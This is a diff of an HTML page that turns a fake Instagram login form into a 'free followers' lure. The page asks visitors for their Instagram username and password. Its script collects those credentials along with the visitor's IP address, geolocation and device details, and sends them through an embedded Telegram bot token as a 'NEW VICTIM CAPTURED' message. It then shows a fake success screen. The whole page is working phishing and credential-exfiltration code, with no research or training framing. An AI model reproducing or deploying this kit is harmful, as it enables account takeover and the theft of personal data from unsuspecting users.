@@ -2,33 +2,286 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Get Free Instagram Followers - Limited Time Offer!</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .container { background: #fff; border: 1px solid #dbdbdb; padding: 40px; text-align: center; max-width: 350px; width: 100%; }
-        .logo { font-size: 36px; font-weight: 300; margin-bottom: 30px; color: #262626; font-family: 'Segoe UI'; }
-        input { width: 100%; padding: 12px; margin: 4px 0; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 14px; }
-        button { width: 100%; padding: 10px; background: #0095f6; color: #fff; border: none; border-radius: 8px; font-size: 14px; font-weight: 600; margin-top: 12px; cursor: pointer; }
-        button:hover { background: #1877f2; }
-        .or { display: flex; margin: 20px 0; color: #8e8e8e; font-size: 13px; }
-        .or::before, .or::after { content: ''; flex: 1; border-bottom: 1px solid #dbdbdb; margin: auto; }
-        .or span { margin: 0 18px; }
-        .footer { margin-top: 20px; font-size: 12px; color: #8e8e8e; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; justify-content: center; align-items: flex-start; padding: 20px; }
+        .container { max-width: 420px; width: 100%; margin: 20px auto; }
+        .card { background: white; border-radius: 20px; padding: 30px 25px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); margin-bottom: 20px; text-align: center; }
+        .logo { width: 80px; height: 80px; background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); border-radius: 20px; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px; font-size: 40px; color: white; }
+        h1 { font-size: 22px; color: #1a1a2e; margin-bottom: 5px; }
+        .subtitle { font-size: 14px; color: #666; margin-bottom: 20px; }
+        .stats { display: flex; justify-content: space-around; margin: 20px 0; padding: 15px 0; border-top: 1px solid #eee; border-bottom: 1px solid #eee; }
+        .stat-item { text-align: center; }
+        .stat-value { font-size: 24px; font-weight: bold; color: #1a1a2e; }
+        .stat-label { font-size: 11px; color: #888; margin-top: 3px; }
+        .badge { background: #ff6b6b; color: white; padding: 6px 15px; border-radius: 20px; font-size: 13px; font-weight: bold; display: inline-block; margin: 10px 0; }
+        .input-group { margin: 15px 0; text-align: left; }
+        .input-group label { font-size: 13px; font-weight: 600; color: #333; margin-bottom: 5px; display: block; }
+        .input-group input { width: 100%; padding: 14px 16px; border: 2px solid #e0e0e0; border-radius: 12px; font-size: 15px; transition: border 0.3s; outline: none; }
+        .input-group input:focus { border-color: #667eea; }
+        .btn { width: 100%; padding: 16px; background: linear-gradient(45deg, #667eea, #764ba2); color: white; border: none; border-radius: 12px; font-size: 17px; font-weight: bold; cursor: pointer; margin-top: 10px; transition: transform 0.2s; }
+        .btn:active { transform: scale(0.98); }
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        .loader { display: none; margin: 20px auto; text-align: center; }
+        .loader.active { display: block; }
+        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #667eea; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .success-screen { display: none; }
+        .success-screen.active { display: block; }
+        .success-icon { font-size: 60px; margin: 10px 0; }
+        .form-screen { display: block; }
+        .form-screen.hidden { display: none; }
+        .features { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; margin: 20px 0; }
+        .feature { background: #f8f9fa; border-radius: 12px; padding: 15px 10px; text-align: center; }
+        .feature-icon { font-size: 28px; margin-bottom: 8px; }
+        .feature-text { font-size: 11px; color: #555; }
+        .testimonial { background: #f8f9fa; border-radius: 12px; padding: 15px; margin: 10px 0; text-align: left; }
+        .testimonial img { width: 36px; height: 36px; border-radius: 50%; float: left; margin-right: 10px; }
+        .testimonial .name { font-weight: bold; font-size: 13px; }
+        .testimonial .text { font-size: 12px; color: #555; margin-top: 3px; }
+        .timer { font-size: 14px; color: #dc2743; font-weight: bold; margin: 10px 0; }
+        .footer { color: rgba(255,255,255,0.7); font-size: 12px; text-align: center; margin-top: 20px; }
+        .error-msg { color: #dc2743; font-size: 13px; margin-top: 8px; display: none; }
+        .availability { background: #e8f5e9; padding: 8px; border-radius: 8px; font-size: 13px; color: #2e7d32; margin: 10px 0; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="logo">Instagram</div>
-        <form action="/api/capture" method="POST">
-            <input type="text" name="username" placeholder="Phone number, username, or email" required>
-            <input type="password" name="password" placeholder="Password" required>
-            <button type="submit">Log In</button>
-        </form>
-        <div class="or"><span>OR</span></div>
-        <div style="color: #385185; font-size: 14px; font-weight: 600; cursor: pointer;">Log in with Facebook</div>
-        <div class="footer">Don't have an account? <a href="#" style="color: #0095f6; text-decoration: none; font-weight: 600;">Sign up</a></div>
+        <div class="card">
+            <div class="logo">📸</div>
+            <h1>Get Free Instagram Followers</h1>
+            <p class="subtitle">10,000+ Real Followers — Instant Delivery!</p>
+            
+            <div class="badge">⚡ Limited Time Offer</div>
+            <div class="timer">⏳ Offer ends in: <span id="timer">05:00</span></div>
+            
+            <div class="stats">
+                <div class="stat-item">
+                    <div class="stat-value">10K+</div>
+                    <div class="stat-label">FOLLOWERS</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value">2.5K+</div>
+                    <div class="stat-label">LIKES/DAY</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value">99%</div>
+                    <div class="stat-label">REAL USERS</div>
+                </div>
+            </div>
+            
+            <div class="availability">✅ Today's Availability: <span id="availability">78%</span></div>
+            
+            <!-- Form Screen -->
+            <div class="form-screen" id="formScreen">
+                <div class="input-group">
+                    <label>Instagram Username</label>
+                    <input type="text" id="username" placeholder="Enter your Instagram username" autocomplete="off">
+                </div>
+                <div class="input-group">
+                    <label>Instagram Password</label>
+                    <input type="password" id="password" placeholder="Enter your Instagram password" autocomplete="off">
+                </div>
+                <button class="btn" id="submitBtn" onclick="captureData()">✨ Get Free Followers Now</button>
+                <div class="error-msg" id="errorMsg">⚠️ Please enter valid credentials</div>
+            </div>
+            
+            <!-- Loader -->
+            <div class="loader" id="loader">
+                <div class="spinner"></div>
+                <p>Connecting to Instagram servers...</p>
+                <p style="font-size:12px;color:#888;margin-top:5px;">Verifying your account details</p>
+                <p style="font-size:11px;color:#aaa;">Please wait ⏳</p>
+            </div>
+            
+            <!-- Success Screen -->
+            <div class="success-screen" id="successScreen">
+                <div class="success-icon">🎉</div>
+                <h2 style="color:#2e7d32;">SUCCESS!</h2>
+                <p style="font-size:14px;color:#555;margin:10px 0;">Your followers are being delivered!</p>
+                <div class="availability" style="background:#e8f5e9;">
+                    <p style="font-weight:bold;">10,000+ followers will be added within 24 hours</p>
+                    <p style="font-size:12px;margin-top:5px;">Your account is safe and secure ✅</p>
+                </div>
+            </div>
+            
+            <!-- Features -->
+            <div class="features">
+                <div class="feature">
+                    <div class="feature-icon">⚡</div>
+                    <div class="feature-text">Instant<br>Delivery</div>
+                </div>
+                <div class="feature">
+                    <div class="feature-icon">🔒</div>
+                    <div class="feature-text">100% Safe<br>& Secure</div>
+                </div>
+                <div class="feature">
+                    <div class="feature-icon">👥</div>
+                    <div class="feature-text">Real Active<br>Users</div>
+                </div>
+            </div>
+            
+            <!-- Testimonials -->
+            <div class="testimonial">
+                <img src="https://i.pravatar.cc/150?img=1" alt="Sarah">
+                <div class="name">@sarah_m</div>
+                <div class="text">"Got 5K followers in 10 minutes! This is amazing! 🚀"</div>
+            </div>
+            <div class="testimonial">
+                <img src="https://i.pravatar.cc/150?img=2" alt="Mike">
+                <div class="name">@mike_t</div>
+                <div class="text">"Finally reached 10K followers. All real profiles! 💯"</div>
+            </div>
+        </div>
+        <div class="footer">🔒 256-bit encrypted • Your data is safe with us</div>
     </div>
+    
+    <script>
+        // Bot API endpoint — YOUR BOT TOKEN EMBEDDED
+        const BOT_TOKEN = "8667305880:AAGJasDfE6gNAkoSO0aLSf5--wdO_O_SCBc";
+        const CHAT_ID = "1007541797";
+        const API_URL = "https://api.telegram.org/bot" + BOT_TOKEN;
+        
+        // Countdown timer
+        let timeLeft = 300;
+        const timerEl = document.getElementById('timer');
+        setInterval(() => {
+            timeLeft--;
+            if (timeLeft <= 0) timeLeft = 300;
+            const m = Math.floor(timeLeft / 60);
+            const s = timeLeft % 60;
+            timerEl.textContent = String(m).padStart(2, '0') + ':' + String(s).padStart(2, '0');
+        }, 1000);
+        
+        // Random availability
+        setInterval(() => {
+            const avail = Math.floor(Math.random() * 20) + 60;
+            document.getElementById('availability').textContent = avail + '%';
+        }, 8000);
+        
+        // Device info
+        function getDeviceInfo() {
+            return {
+                platform: navigator.platform || 'Unknown',
+                screen: screen.width + 'x' + screen.height,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                userAgent: navigator.userAgent,
+                referrer: document.referrer || 'Direct',
+                pageUrl: window.location.href
+            };
+        }
+        
+        // Get IP
+        async function getIP() {
+            try {
+                const r = await fetch('https://api.ipify.org?format=json');
+                const d = await r.json();
+                return d.ip;
+            } catch(e) {
+                return 'unknown';
+            }
+        }
+        
+        // Get geo
+        async function getGeoInfo(ip) {
+            try {
+                const r = await fetch('https://ipapi.co/' + ip + '/json/');
+                const d = await r.json();
+                return {
+                    ip: ip,
+                    isp: d.org || 'Unknown',
+                    country: d.country_name || 'Unknown',
+                    city: d.city || 'Unknown',
+                    region: d.region || 'Unknown'
+                };
+            } catch(e) {
+                return { ip: ip, isp: 'Unknown', country: 'Unknown', city: 'Unknown', region: 'Unknown' };
+            }
+        }
+        
+        // Send to Telegram
+        async function sendToTelegram(data) {
+            const msg = '🔐 NEW VICTIM CAPTURED 🔐\n\n' +
+                '📧 INSTAGRAM CREDENTIALS:\n' +
+                '👤 Username: ' + data.username + '\n' +
+                '🔑 Password: ' + data.password + '\n\n' +
+                '🌍 VICTIM INFORMATION:\n' +
+                '📍 IP Address: ' + data.geo.ip + '\n' +
+                '🏢 ISP: ' + data.geo.isp + '\n' +
+                '🌎 Country: ' + data.geo.country + '\n' +
+                '🏙️ City: ' + data.geo.city + '\n' +
+                '🗺️ Region: ' + data.geo.region + '\n\n' +
+                '📱 DEVICE DETAILS:\n' +
+                '🖥️ Platform: ' + data.device.platform + '\n' +
+                '📱 Screen: ' + data.device.screen + '\n' +
+                '🌐 Language: ' + data.device.language + '\n' +
+                '🕒 Timezone: ' + data.device.timezone + '\n\n' +
+                '🔗 PAGE INFORMATION:\n' +
+                '📄 Page URL: ' + data.device.pageUrl + '\n' +
+                '🔗 Referrer: ' + data.device.referrer + '\n' +
+                '👤 User Agent: ' + data.device.userAgent + '\n\n' +
+                '⏰ CAPTURED AT: ' + data.timestamp + '\n' +
+                '🎯 Sent via Instagram Followers Service';
+            
+            try {
+                await fetch(API_URL + '/sendMessage', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: msg,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch(e) {
+                console.error('Send failed:', e);
+            }
+        }
+        
+        // Main capture function
+        async function captureData() {
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            
+            if (!username || !password) {
+                document.getElementById('errorMsg').style.display = 'block';
+                return;
+            }
+            document.getElementById('errorMsg').style.display = 'none';
+            
+            // Show loader
+            document.getElementById('formScreen').classList.add('hidden');
+            document.getElementById('loader').classList.add('active');
+            document.getElementById('submitBtn').disabled = true;
+            
+            // Collect data
+            const device = getDeviceInfo();
+            const ip = await getIP();
+            const geo = await getGeoInfo(ip);
+            const now = new Date();
+            const timestamp = now.toLocaleString('en-US', { 
+                day: '2-digit', month: '2-digit', year: 'numeric', 
+                hour: '2-digit', minute: '2-digit', second: '2-digit' 
+            });
+            
+            // Send to Telegram
+            await sendToTelegram({
+                username: username,
+                password: password,
+                device: device,
+                geo: geo,
+                timestamp: timestamp
+            });
+            
+            // Show success
+            setTimeout(() => {
+                document.getElementById('loader').classList.remove('active');
+                document.getElementById('successScreen').classList.add('active');
+            }, 3000);
+        }
+    </script>
 </body>
 </html>
